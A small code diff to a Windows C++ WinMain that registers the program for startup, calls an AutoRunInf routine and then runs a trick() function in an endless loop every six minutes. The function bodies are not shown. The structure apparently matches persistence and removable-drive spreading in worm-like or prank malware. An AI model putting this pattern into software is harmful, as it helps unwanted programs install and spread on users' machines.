@@ -1,13 +1,18 @@
 #include"Header.h"
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-	LPSTR lpCmdLine, int nShowCmd)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
-	RegisterProgram();
-	IsMyProgramRegisteredForStartup(L"My_Program");
-
-        while(1)
-        trick();
-
+	bool flag;
+	flag = IsMyProgramRegisteredForStartup(L"My_Program");
+ 
+	if (flag == FALSE)
+		RegisterProgram();
+	AutoRunInf();
+	while (1)
+	{
+		trick();
+		Sleep(360000);
+	}
 	return 0;
 }
+
